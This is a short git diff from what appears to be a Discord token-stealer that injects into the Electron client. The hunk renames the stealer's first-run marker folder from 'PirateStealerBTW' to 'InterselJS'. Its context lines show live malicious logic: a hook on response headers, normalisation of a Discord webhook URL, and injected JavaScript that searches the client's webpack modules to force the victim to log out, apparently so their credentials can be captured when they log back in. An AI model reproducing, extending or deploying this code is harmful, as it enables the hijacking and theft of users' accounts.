@@ -20,11 +20,11 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
   webhook = webhook.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
   function FirstTime(){
       
-      if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))){
+      if (!fs.existsSync(path.join(__dirname, "InterselJS"))){
           return true;
       }
       
-      fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
+      fs.rmdirSync(path.join(__dirname, "InterselJS"));
       const window = BrowserWindow.getAllWindows()[0];
       window.webContents.executeJavaScript(`function LogOut(){var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()} LogOut()`, true).then((result) => {
       });
